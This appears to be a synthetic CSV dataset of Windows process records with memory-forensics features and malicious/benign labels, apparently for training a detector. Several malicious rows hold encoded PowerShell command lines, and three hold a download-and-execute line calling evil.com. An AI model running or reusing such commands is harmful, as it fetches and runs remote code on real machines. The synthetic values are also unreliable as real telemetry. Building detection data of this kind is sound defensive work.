process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
taskmgr.exe,3913,5911,C:\Windows\System32\taskmgr.exe,116,39,130,40.74,11.67,0,1,18,0,0,0,0.216,0,98,0,0,0,0,0,0,0,0,0,0.0461,0
System,4,937,C:\Windows\System32\System,46,37,98,48.81,27.75,1,1,7,0,0,0,0.134,0,47,0,0,0,0,0,0,0,0,0,0.0568,0
spoolsv.exe,7381,6208,C:\Windows\System32\spoolsv.exe,100,3,85,12.5,13.23,0,1,10,0,0,0,0.322,0,45,0,0,0,0,0,0,0,0,0,0.0778,0
smss.exe,4862,4,C:\Windows\System32\smss.exe,83,25,337,138.41,2.14,0,1,76,0,0,0,0.226,0,37,0,0,0,0,0,0,0,0,0,0.0566,0
winlogon.exe,682,8160,C:\Windows\System32\winlogon.exe,104,8,123,24.86,99.9,0,1,53,0,0,0,0.051,0,61,0,0,0,0,0,0,0,0,0,0.1429,0
firefox.exe,1454,886,C:\Windows\System32\firefox.exe,89,2,82,9.59,0.98,1,1,76,1,19,0,0.277,0,114,0,0,0,0,0,0,0,0,0,0.0707,0
csrss.exe,697,4609,C:\Windows\System32\csrss.exe,117,21,223,79.59,55.02,0,1,31,0,0,0,0.267,0,47,0,0,0,0,0,0,0,0,0,0.0576,0
smss.exe,9682,4,C:\Windows\System32\smss.exe,20,34,51,113.44,70.55,0,1,47,0,0,0,0.258,0,71,0,0,0,0,0,0,0,0,0,0.0089,0
System,4,2159,C:\Windows\System32\System,69,18,124,61.0,63.21,0,1,50,0,0,0,0.076,0,56,0,0,0,0,0,0,0,0,0,0.0177,0
powershell.exe,9856,5086,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...IaicVhlXrVPpL=Qg=wmOWnZUmIpzNk3AtXSYBq/yLmEFTOVxO0MxPUSRHv1yEqt8NFoycep1b=jcK+x4Wa2WiAtl20slfoCZJT+j4UkLJKD4ASK5/r7cFZj9r71KSLMbglHIqYiuVyiF4w9,211,7,47,43.6,34.61,1,1,35,1,3,2,0.638,1,68,1,0,0,0,1,1,0,0,4,0.8804,1
RuntimeBroker.exe,3691,7007,C:\Windows\System32\RuntimeBroker.exe,76,23,279,181.51,42.22,0,1,53,0,0,0,0.153,0,89,0,0,0,0,0,0,0,0,0,0.066,0
services.exe,2784,3095,C:\Windows\System32\services.exe,52,36,160,3.23,98.67,1,1,21,0,0,0,0.294,0,119,0,0,0,0,0,0,0,0,0,0.0425,0
services.exe,1145,9112,C:\Windows\System32\services.exe,60,26,417,172.25,17.19,0,1,5,0,0,0,0.151,0,65,0,0,0,0,0,0,0,0,0,0.1259,0
chrome.exe,2403,1087,chrome.exe --type=renderer --disable-gpu,31,18,288,13.16,83.41,1,1,7,1,3,0,0.289,0,102,0,0,0,0,0,0,0,0,0,0.1322,0
taskmgr.exe,5431,6906,C:\Windows\System32\taskmgr.exe,28,8,173,194.44,70.96,0,1,49,0,0,0,0.142,0,81,0,0,0,0,0,0,0,0,0,0.0449,0
spoolsv.exe,8830,769,C:\Windows\System32\spoolsv.exe,94,25,344,60.58,24.52,0,1,29,0,0,0,0.097,0,54,0,0,0,0,0,0,0,0,0,0.0425,0
wininit.exe,8229,8071,C:\Windows\System32\wininit.exe,55,29,183,69.82,79.17,1,1,70,0,0,0,0.147,0,112,0,0,0,0,0,0,0,0,0,0.0417,0
winlogon.exe,751,5064,C:\Windows\System32\winlogon.exe,27,3,326,123.33,42.02,1,1,47,0,0,0,0.096,0,86,0,0,0,0,0,0,0,0,0,0.0113,0
MsMpEng.exe,9897,5162,"""C:\Program Files\Windows Defender\MsMpEng.exe""",55,32,346,85.96,73.3,0,1,11,0,0,0,0.299,0,67,0,0,0,0,0,0,0,0,0,0.1416,0
powershell.exe,6259,6849,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...K=fnkBaiScZDHvyAFZNyqfsJ6SYrYKk71FyMnZp1Ts0PN=sYEurFFxE3lbAEXKHWoK8khIFtmP2AywqTqhmYZIj,170,8,49,40.05,76.38,1,1,36,1,3,2,0.81,0,77,0,0,0,0,1,1,0,0,2,0.8022,1
notepad.exe,7127,4856,C:\Windows\System32\notepad.exe,68,5,66,81.07,84.44,1,0,7,1,3,4,0.896,1,50,1,1,0,0,0,0,0,1,5,0.7886,1
powershell.exe,7460,1020,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...celNSScwtny=6nBDAlJUIEPf51UgFMOWtzMnNaLkzN7ZOcMZxjtafl6c2qVGkwSbzRuJhjh/IgrJqv46v6vuqJ=L,176,8,93,61.91,67.97,1,1,32,1,2,2,0.802,1,128,1,0,0,0,1,1,0,0,3,0.9177,1
MsMpEng.exe,5536,8988,"""C:\Program Files\Windows Defender\MsMpEng.exe""",35,27,445,12.4,21.66,1,1,73,0,0,0,0.317,0,44,0,0,0,0,0,0,0,0,0,0.0361,0
explorer.exe,5220,8020,C:\Windows\Explorer.EXE,31,13,447,134.58,30.18,1,1,21,0,0,0,0.255,0,107,0,0,0,0,0,0,0,0,0,0.0449,0
notepad.exe,1799,5943,C:\Windows\System32\notepad.exe,47,11,181,196.18,166.46,1,0,90,1,6,4,0.647,1,82,0,0,1,1,0,0,0,0,2,0.9317,1
notepad.exe,8345,7001,C:\Windows\System32\notepad.exe,20,25,177,99.38,30.12,1,1,79,0,0,0,0.119,0,43,0,0,0,0,0,0,0,0,0,0.1377,0
SearchIndexer.exe,6643,6895,C:\Windows\System32\SearchIndexer.exe,35,38,238,156.76,8.73,0,1,25,0,0,0,0.197,0,68,0,0,0,0,0,0,0,0,0,0.1407,0
MsMpEng.exe,6322,9186,"""C:\Program Files\Windows Defender\MsMpEng.exe""",90,2,259,197.45,87.97,0,1,19,0,0,0,0.286,0,117,0,0,0,0,0,0,0,0,0,0.0802,0
winlogon.exe,1423,6699,C:\Windows\System32\winlogon.exe,42,22,241,169.31,61.87,0,1,35,0,0,0,0.1,0,74,0,0,0,0,0,0,0,0,0,0.038,0
services.exe,8871,7853,C:\Windows\System32\services.exe,62,22,200,34.64,26.42,1,1,73,0,0,0,0.143,0,24,0,0,0,0,0,0,0,0,0,0.0362,0
System,4,9625,C:\Windows\System32\System,31,11,394,157.4,69.69,1,1,8,0,0,0,0.267,0,58,0,0,0,0,0,0,0,0,0,0.0237,0
explorer.exe,1005,6480,C:\Windows\Explorer.EXE,41,2,435,102.64,9.47,0,1,58,0,0,0,0.125,0,106,0,0,0,0,0,0,0,0,0,0.0464,0
svchost.exe,2286,8442,C:\Windows\System32\svchost.exe,36,4,71,49.94,97.58,1,0,12,1,5,1,0.612,1,176,1,1,0,0,0,0,0,1,5,0.9479,1
winlogon.exe,8225,9795,C:\Windows\System32\winlogon.exe,97,33,69,199.82,66.74,0,1,15,0,0,0,0.077,0,85,0,0,0,0,0,0,0,0,0,0.1346,0
calc.exe,4221,539,C:\Windows\System32\calc.exe,43,21,206,170.82,30.24,1,1,49,0,0,0,0.169,0,31,0,0,0,0,0,0,0,0,0,0.133,0
services.exe,4637,5162,C:\Windows\System32\services.exe,88,24,422,172.5,56.54,1,1,27,0,0,0,0.057,0,107,0,0,0,0,0,0,0,0,0,0.1238,0
chrome.exe,9205,2633,chrome.exe --type=renderer --disable-gpu,41,26,391,111.45,9.86,0,1,47,0,11,0,0.278,0,113,0,0,0,0,0,0,0,0,0,0.1384,0
RuntimeBroker.exe,3424,2594,C:\Windows\System32\RuntimeBroker.exe,45,15,435,138.93,84.74,1,1,56,0,0,0,0.122,0,74,0,0,0,0,0,0,0,0,0,0.1069,0
System,4,7382,C:\Windows\System32\System,88,21,379,54.36,66.26,1,1,70,0,0,0,0.233,0,105,0,0,0,0,0,0,0,0,0,0.0074,0
powershell.exe,5643,6910,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...z4Qw5mgXzyaG6UPwcKS2EuYi4ni20VjI/n1W+h9l1bEVoJpFs+IL,120,3,109,45.68,57.36,1,1,38,1,2,0,0.671,1,55,0,0,0,0,1,1,0,0,3,0.6372,1
spoolsv.exe,6996,6514,C:\Windows\System32\spoolsv.exe,86,34,240,117.04,98.74,1,1,23,0,0,0,0.222,0,60,0,0,0,0,0,0,0,0,0,0.0824,0
firefox.exe,7160,6104,C:\Windows\System32\firefox.exe,57,23,448,13.78,76.87,0,1,58,0,12,0,0.179,0,58,0,0,0,0,0,0,0,0,0,0.1223,0
SearchIndexer.exe,6060,1800,C:\Windows\System32\SearchIndexer.exe,45,10,156,189.15,38.39,1,1,57,0,0,0,0.083,0,33,0,0,0,0,0,0,0,0,0,0.001,0
conhost.exe,8281,6589,C:\Windows\System32\conhost.exe,31,19,385,59.23,80.49,1,1,9,0,0,0,0.292,0,52,0,0,0,0,0,0,0,0,0,0.013,0
MsMpEng.exe,2069,408,"""C:\Program Files\Windows Defender\MsMpEng.exe""",22,8,453,141.05,20.83,0,1,56,0,0,0,0.316,0,29,0,0,0,0,0,0,0,0,0,0.1146,0
lsass.exe,7792,1876,C:\Windows\System32\lsass.exe,25,30,231,166.99,68.29,1,1,19,0,0,0,0.103,0,42,0,0,0,0,0,0,0,0,0,0.0397,0
calc.exe,1988,6728,C:\Windows\System32\calc.exe,105,1,170,161.89,27.7,0,1,5,0,0,0,0.178,0,81,0,0,0,0,0,0,0,0,0,0.1365,0
smss.exe,2241,4,C:\Windows\System32\smss.exe,53,8,252,81.07,76.88,1,1,71,0,0,0,0.246,0,106,0,0,0,0,0,0,0,0,0,0.0443,0
winlogon.exe,6986,2156,C:\Windows\System32\winlogon.exe,105,34,295,98.48,63.4,1,1,30,0,0,0,0.123,0,60,0,0,0,0,0,0,0,0,0,0.1386,0
OneDrive.exe,5918,5850,C:\Windows\System32\OneDrive.exe,65,8,215,146.07,77.85,0,1,22,1,0,0,0.283,0,86,0,0,0,0,0,0,0,0,0,0.0204,0
services.exe,3629,3397,C:\Windows\System32\services.exe,119,25,283,111.06,83.56,0,1,41,0,0,0,0.164,0,58,0,0,0,0,0,0,0,0,0,0.0054,0
MsMpEng.exe,6135,5943,"""C:\Program Files\Windows Defender\MsMpEng.exe""",41,14,51,65.63,59.16,0,1,39,0,0,0,0.141,0,117,0,0,0,0,0,0,0,0,0,0.1409,0
MsMpEng.exe,1333,3108,"""C:\Program Files\Windows Defender\MsMpEng.exe""",30,16,205,106.2,9.09,0,1,70,0,0,0,0.327,0,107,0,0,0,0,0,0,0,0,0,0.1232,0
chrome.exe,5885,1473,chrome.exe --type=renderer --disable-gpu,62,16,471,35.26,76.53,1,1,28,0,7,0,0.174,0,112,0,0,0,0,0,0,0,0,0,0.0033,0
notepad.exe,5987,2639,C:\Windows\System32\notepad.exe,43,17,282,78.13,57.28,1,0,118,0,3,2,0.697,1,102,0,0,1,0,0,0,0,0,1,0.6899,1
notepad.exe,8849,8244,C:\Windows\System32\notepad.exe,64,6,87,65.68,60.14,1,0,13,1,1,3,0.901,1,148,1,1,0,0,0,0,0,1,2,0.7658,1
OneDrive.exe,2892,3191,C:\Windows\System32\OneDrive.exe,106,14,59,48.65,71.13,0,1,61,0,0,0,0.247,0,59,0,0,0,0,0,0,0,0,0,0.0918,0
System,4,6400,C:\Windows\System32\System,98,22,336,64.92,50.04,1,1,66,0,0,0,0.13,0,20,0,0,0,0,0,0,0,0,0,0.1087,0
winlogon.exe,7335,4438,C:\Windows\System32\winlogon.exe,111,17,390,101.0,42.07,0,1,40,0,0,0,0.201,0,45,0,0,0,0,0,0,0,0,0,0.0228,0
wininit.exe,8768,4405,C:\Windows\System32\wininit.exe,78,8,105,193.85,65.99,0,1,78,0,0,0,0.197,0,113,0,0,0,0,0,0,0,0,0,0.005,0
powershell.exe,6209,4689,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...+8mzGW59LfSdpsu9WmQfaP9TsQlaRHV1fxdE29VXhkngntPNTnOnKQLZz=tf9BgFcPbTQoR,159,3,59,79.12,37.2,1,1,38,1,3,1,0.637,0,90,1,0,0,0,1,1,0,0,3,0.8208,1
winlogon.exe,6629,7215,C:\Windows\System32\winlogon.exe,77,35,74,147.83,17.51,1,1,36,0,0,0,0.196,0,29,0,0,0,0,0,0,0,0,0,0.0142,0
conhost.exe,6330,5034,C:\Windows\System32\conhost.exe,98,3,274,11.41,39.77,0,1,14,0,0,0,0.269,0,33,0,0,0,0,0,0,0,0,0,0.125,0
explorer.exe,1892,9073,C:\Windows\Explorer.EXE,118,16,346,55.88,88.04,0,1,54,0,0,0,0.152,0,67,0,0,0,0,0,0,0,0,0,0.0324,0
powershell.exe,409,8638,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...jSQJqUsLS0Iro6p=mi7gLiu7Mt1ayG0eS/1Yb3FjIMMRLDGr+lGNuyyQlKIBVOb8WyZpN9X7/DcUBqIpxFzBvP/1VcLp70uQ1887nN=1=y7JDQRN58d0cYZoLQuePc0fHact5a,202,2,173,89.15,78.52,1,1,53,1,3,2,0.722,1,55,1,0,0,0,1,1,0,0,2,0.8519,1
spoolsv.exe,5818,9705,C:\Windows\System32\spoolsv.exe,65,29,204,25.51,72.32,1,1,46,0,0,0,0.12,0,49,0,0,0,0,0,0,0,0,0,0.1469,0
taskmgr.exe,8478,4315,C:\Windows\System32\taskmgr.exe,64,3,161,18.55,95.29,0,1,28,0,0,0,0.178,0,88,0,0,0,0,0,0,0,0,0,0.0301,0
explorer.exe,5614,6964,C:\Windows\Explorer.EXE,74,14,453,47.78,32.87,1,1,73,0,0,0,0.209,0,118,0,0,0,0,0,0,0,0,0,0.0886,0
spoolsv.exe,6325,4826,C:\Windows\System32\spoolsv.exe,105,27,352,78.18,81.32,1,1,46,0,0,0,0.191,0,90,0,0,0,0,0,0,0,0,0,0.1339,0
OneDrive.exe,3349,6785,C:\Windows\System32\OneDrive.exe,62,2,422,63.82,14.96,0,1,79,1,0,0,0.229,0,23,0,0,0,0,0,0,0,0,0,0.0975,0
System,4,9222,C:\Windows\System32\System,47,11,177,135.27,91.08,1,1,20,0,0,0,0.213,0,74,0,0,0,0,0,0,0,0,0,0.1429,0
taskmgr.exe,4302,4626,C:\Windows\System32\taskmgr.exe,111,14,261,146.97,87.9,1,1,33,0,0,0,0.205,0,28,0,0,0,0,0,0,0,0,0,0.1097,0
services.exe,885,1600,C:\Windows\System32\services.exe,98,21,189,40.44,89.63,1,1,62,0,0,0,0.315,0,39,0,0,0,0,0,0,0,0,0,0.1144,0
chrome.exe,8118,1784,chrome.exe --type=renderer --disable-gpu,66,7,133,93.3,29.3,0,1,64,0,18,0,0.291,0,83,0,0,0,0,0,0,0,0,0,0.0411,0
csrss.exe,8500,8286,C:\Windows\System32\csrss.exe,42,12,340,60.41,76.44,0,1,78,0,0,0,0.075,0,44,0,0,0,0,0,0,0,0,0,0.0621,0
RuntimeBroker.exe,6968,9088,C:\Windows\System32\RuntimeBroker.exe,77,9,228,122.83,12.9,1,1,17,0,0,0,0.141,0,47,0,0,0,0,0,0,0,0,0,0.1016,0
MsMpEng.exe,3256,4604,"""C:\Program Files\Windows Defender\MsMpEng.exe""",29,11,485,161.03,35.74,0,1,57,0,0,0,0.117,0,68,0,0,0,0,0,0,0,0,0,0.1029,0
wininit.exe,6087,1062,C:\Windows\System32\wininit.exe,49,24,230,191.7,25.59,0,1,40,0,0,0,0.119,0,92,0,0,0,0,0,0,0,0,0,0.0924,0
firefox.exe,1824,5822,C:\Windows\System32\firefox.exe,38,5,285,125.54,36.09,1,1,10,0,17,0,0.108,0,37,0,0,0,0,0,0,0,0,0,0.0859,0
System,4,8123,C:\Windows\System32\System,35,9,244,93.06,81.57,0,1,77,0,0,0,0.173,0,92,0,0,0,0,0,0,0,0,0,0.0892,0
explorer.exe,1349,6411,C:\Windows\Explorer.EXE,110,12,245,184.46,51.54,0,1,78,0,0,0,0.157,0,82,0,0,0,0,0,0,0,0,0,0.0414,0
conhost.exe,3070,8809,C:\Windows\System32\conhost.exe,69,30,459,53.43,48.15,1,1,26,0,0,0,0.12,0,53,0,0,0,0,0,0,0,0,0,0.0015,0
mspaint.exe,3295,2592,C:\Windows\System32\mspaint.exe,56,6,177,69.06,35.44,1,0,11,1,2,2,0.685,1,161,1,1,0,0,0,0,0,1,5,0.8077,1
wininit.exe,2591,1485,C:\Windows\System32\wininit.exe,40,33,484,138.31,59.43,0,1,45,0,0,0,0.073,0,116,0,0,0,0,0,0,0,0,0,0.0938,0
powershell.exe,2986,6566,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...ehs7fQloPYo5gPwxOJnv=9ZLjCGPVcrOvL=J+cfKnJxROGX7sxI7UTO8pXWmz7IZaBpsvUuf75U3lLCftCF5YWySp6w4HCgln0Zj9uC+LM9ZplgXfnIagP=0K4i1W,213,3,50,36.48,52.93,1,1,45,1,4,0,0.684,0,42,0,0,0,0,1,1,0,0,2,0.8393,1
powershell.exe,6919,4777,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...MbfFipvnD72sB9L6vYOrUnRIIk2mNpq2RADTMogJVa+ULpr/l977uSL=H3OA2/wSMMGMY1GxZnLfen+Jq/KKLJNP8mwwrhFefAYoRtdTUYtkLNlOmIq4FfuVSspuHjBra8L,199,8,62,50.73,41.93,1,1,28,1,1,1,0.596,0,68,0,0,0,0,1,1,0,0,3,0.799,1
wininit.exe,7962,1577,C:\Windows\System32\wininit.exe,52,13,312,174.0,97.1,0,1,6,0,0,0,0.148,0,65,0,0,0,0,0,0,0,0,0,0.0071,0
conhost.exe,1336,3376,C:\Windows\System32\conhost.exe,97,17,295,163.25,84.09,0,1,49,0,0,0,0.34,0,75,0,0,0,0,0,0,0,0,0,0.1015,0
calc.exe,2523,9178,C:\Windows\System32\calc.exe,66,5,70,123.04,37.07,1,0,9,1,9,3,0.826,1,187,1,1,0,0,0,0,0,1,5,0.8075,1
winlogon.exe,7684,4761,C:\Windows\System32\winlogon.exe,70,34,268,63.01,45.5,0,1,37,0,0,0,0.322,0,115,0,0,0,0,0,0,0,0,0,0.1228,0
notepad.exe,1291,3764,C:\Windows\System32\notepad.exe,35,7,161,287.24,55.67,1,0,138,1,3,5,0.574,1,245,0,0,1,0,0,0,0,0,2,0.7705,1
calc.exe,1612,9433,C:\Windows\System32\calc.exe,37,6,70,112.49,49.95,1,0,6,1,5,1,0.95,1,95,1,1,0,0,0,0,0,1,3,0.9547,1
svchost.exe,405,7155,C:\Windows\system32\svchost.exe -k netsvcs,101,18,73,151.42,35.33,0,1,34,0,0,0,0.124,0,63,0,0,0,0,0,0,0,0,0,0.0446,0
wmiprvse.exe,4518,792,wmiprvse.exe -secured -Embedding,76,7,124,102.82,84.04,1,1,37,1,3,2,0.609,0,132,0,0,0,0,0,0,1,0,3,0.5661,1
mspaint.exe,1104,7021,C:\Windows\System32\mspaint.exe,77,6,177,120.79,81.98,1,0,8,1,9,2,0.906,1,136,1,1,0,0,0,0,0,1,2,0.7273,1
powershell.exe,6854,9444,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...jLbFvl1KRd0B5arz1wqU54gZnUsibEV=qxynNMQOpmH1cFD7pIvJX=58Btuew43hOdbqxY9rAUctNt4YyZIgK2XKjtO6L8jMNx3ZjTwimEtTlPo=I3jT9N,201,3,73,95.15,16.97,1,1,54,1,2,1,0.575,1,44,0,0,0,0,1,1,0,0,2,0.8736,1
spoolsv.exe,3435,9647,C:\Windows\System32\spoolsv.exe,116,15,111,166.97,82.18,0,1,57,0,0,0,0.275,0,92,0,0,0,0,0,0,0,0,0,0.0963,0
notepad.exe,4820,3547,C:\Windows\System32\notepad.exe,34,8,153,200.87,160.16,1,0,90,0,6,5,0.682,1,150,0,0,1,0,0,0,0,0,2,0.7517,1
firefox.exe,4742,3676,C:\Windows\System32\firefox.exe,90,25,225,106.27,3.83,0,1,33,1,10,0,0.127,0,25,0,0,0,0,0,0,0,0,0,0.1036,0
mspaint.exe,7161,1136,C:\Windows\System32\mspaint.exe,50,2,137,92.91,45.82,1,0,13,1,2,1,0.678,1,70,1,1,0,0,0,0,0,1,3,0.6548,1
notepad.exe,5368,4715,C:\Windows\System32\notepad.exe,30,14,154,97.44,52.4,1,0,105,1,0,7,0.862,1,172,0,0,1,0,0,0,0,0,1,0.7189,1
MsMpEng.exe,7913,5354,"""C:\Program Files\Windows Defender\MsMpEng.exe""",37,23,466,41.07,92.99,1,1,6,0,0,0,0.327,0,71,0,0,0,0,0,0,0,0,0,0.0018,0
svchost.exe,4801,5691,C:\Windows\system32\svchost.exe -k netsvcs,29,39,332,162.0,65.31,1,1,62,0,0,0,0.176,0,70,0,0,0,0,0,0,0,0,0,0.1052,0
svchost.exe,6122,9473,wmiprvse.exe -secured -Embedding,37,11,146,105.7,44.54,1,1,45,1,1,1,0.556,1,154,1,0,0,0,0,0,1,0,2,0.5652,1
SearchIndexer.exe,4675,2821,C:\Windows\System32\SearchIndexer.exe,60,15,51,47.87,34.1,0,1,28,0,0,0,0.286,0,117,0,0,0,0,0,0,0,0,0,0.0583,0
firefox.exe,2503,4377,C:\Windows\System32\firefox.exe,119,2,475,145.08,83.82,0,1,13,0,11,0,0.289,0,108,0,0,0,0,0,0,0,0,0,0.1305,0
MsMpEng.exe,8169,7627,"""C:\Program Files\Windows Defender\MsMpEng.exe""",23,26,144,131.63,75.12,0,1,9,0,0,0,0.281,0,89,0,0,0,0,0,0,0,0,0,0.0584,0
lsass.exe,8368,4350,C:\Windows\System32\lsass.exe,24,33,311,103.23,55.67,1,1,23,0,0,0,0.23,0,77,0,0,0,0,0,0,0,0,0,0.0969,0
SearchIndexer.exe,1988,6756,C:\Windows\System32\SearchIndexer.exe,25,4,284,35.09,56.71,1,1,5,0,0,0,0.19,0,77,0,0,0,0,0,0,0,0,0,0.0784,0
WmiPrvSE.exe,2017,1650,wmiprvse.exe -secured -Embedding,90,3,264,82.23,64.07,1,1,34,1,0,3,0.489,1,62,0,0,0,0,0,0,1,0,2,0.8377,1
conhost.exe,5066,9478,C:\Windows\System32\conhost.exe,29,30,430,178.8,52.13,1,1,40,0,0,0,0.282,0,51,0,0,0,0,0,0,0,0,0,0.0992,0
firefox.exe,3587,5329,C:\Windows\System32\firefox.exe,114,15,387,52.26,86.73,0,1,60,1,17,0,0.115,0,74,0,0,0,0,0,0,0,0,0,0.1169,0
mspaint.exe,1323,3212,C:\Windows\System32\mspaint.exe,77,3,162,119.94,75.82,1,0,12,1,5,4,0.93,1,198,1,1,0,0,0,0,0,1,4,0.6859,1
cmd.exe,8535,5038,cmd.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),129,3,23,10.11,24.0,1,1,31,1,1,1,0.779,1,34,1,0,0,0,0,1,0,0,3,0.71,1
explorer.exe,4711,5080,C:\Windows\System32\explorer.exe,33,5,135,175.07,96.56,1,0,75,1,5,3,0.934,1,190,0,0,1,0,0,0,0,0,1,0.6156,1
services.exe,1501,3530,C:\Windows\System32\services.exe,27,14,52,10.76,82.66,1,1,72,0,0,0,0.283,0,119,0,0,0,0,0,0,0,0,0,0.1173,0
calc.exe,4028,1688,C:\Windows\System32\calc.exe,33,6,59,136.76,57.07,1,0,4,1,5,3,0.701,1,98,1,1,0,0,0,0,0,1,4,0.7154,1
smss.exe,2323,4,C:\Windows\System32\smss.exe,104,11,62,8.61,13.85,1,1,47,0,0,0,0.292,0,30,0,0,0,0,0,0,0,0,0,0.0953,0
services.exe,9600,8767,C:\Windows\System32\services.exe,96,10,483,119.17,47.35,0,1,76,0,0,0,0.237,0,56,0,0,0,0,0,0,0,0,0,0.1243,0
csrss.exe,1378,2573,C:\Windows\System32\csrss.exe,68,35,378,192.46,59.38,0,1,49,0,0,0,0.159,0,34,0,0,0,0,0,0,0,0,0,0.0479,0
csrss.exe,7208,7508,C:\Windows\System32\csrss.exe,47,34,134,17.88,34.52,0,1,58,0,0,0,0.292,0,73,0,0,0,0,0,0,0,0,0,0.0445,0
services.exe,5680,7164,C:\Windows\System32\services.exe,67,29,122,18.09,16.25,1,1,62,0,0,0,0.33,0,33,0,0,0,0,0,0,0,0,0,0.137,0
chrome.exe,497,5537,chrome.exe --type=renderer --disable-gpu,90,23,324,51.77,62.74,0,1,29,1,19,0,0.17,0,64,0,0,0,0,0,0,0,0,0,0.0035,0
certutil.exe,5657,748,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),150,5,132,45.39,34.25,1,1,31,1,2,2,0.631,0,36,1,0,0,0,1,1,0,0,4,0.8653,1
svchost.exe,9096,7742,C:\Windows\system32\svchost.exe -k netsvcs,46,33,156,68.6,4.71,0,1,51,0,0,0,0.225,0,106,0,0,0,0,0,0,0,0,0,0.0447,0
smss.exe,2997,4,C:\Windows\System32\smss.exe,45,18,187,113.29,41.58,0,1,13,0,0,0,0.317,0,69,0,0,0,0,0,0,0,0,0,0.0801,0
lsass.exe,8815,4543,C:\Windows\System32\lsass.exe,102,29,131,179.06,10.54,0,1,72,0,0,0,0.199,0,106,0,0,0,0,0,0,0,0,0,0.0643,0
OneDrive.exe,3257,3281,C:\Windows\System32\OneDrive.exe,85,16,159,49.93,73.12,1,1,11,1,0,0,0.079,0,61,0,0,0,0,0,0,0,0,0,0.0301,0
notepad.exe,4860,5189,C:\Windows\System32\notepad.exe,21,25,61,159.81,26.23,1,1,63,0,0,0,0.051,0,101,0,0,0,0,0,0,0,0,0,0.093,0
smss.exe,8725,4,C:\Windows\System32\smss.exe,32,18,262,24.51,94.46,0,1,49,0,0,0,0.257,0,63,0,0,0,0,0,0,0,0,0,0.0863,0
wmiprvse.exe,2458,4933,wmiprvse.exe -secured -Embedding,92,6,274,76.06,34.16,1,1,33,0,3,3,0.731,0,151,0,0,0,0,0,0,1,0,3,0.5728,1
notepad.exe,3437,7606,C:\Windows\System32\notepad.exe,32,33,423,139.31,39.69,0,1,53,0,0,0,0.118,0,119,0,0,0,0,0,0,0,0,0,0.0421,0
spoolsv.exe,4415,7023,C:\Windows\System32\spoolsv.exe,48,38,391,167.94,79.59,1,1,71,0,0,0,0.24,0,40,0,0,0,0,0,0,0,0,0,0.1135,0
SearchIndexer.exe,1302,649,C:\Windows\System32\SearchIndexer.exe,61,15,448,149.61,26.61,0,1,5,0,0,0,0.122,0,113,0,0,0,0,0,0,0,0,0,0.0184,0
chrome.exe,2057,9266,chrome.exe --type=renderer --disable-gpu,73,32,160,46.92,3.2,0,1,76,0,14,0,0.241,0,57,0,0,0,0,0,0,0,0,0,0.0797,0
rundll32.exe,5078,1387,rundll32.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),168,5,95,46.92,35.96,1,1,22,1,2,0,0.485,1,48,1,0,0,0,1,1,0,0,4,0.7448,1
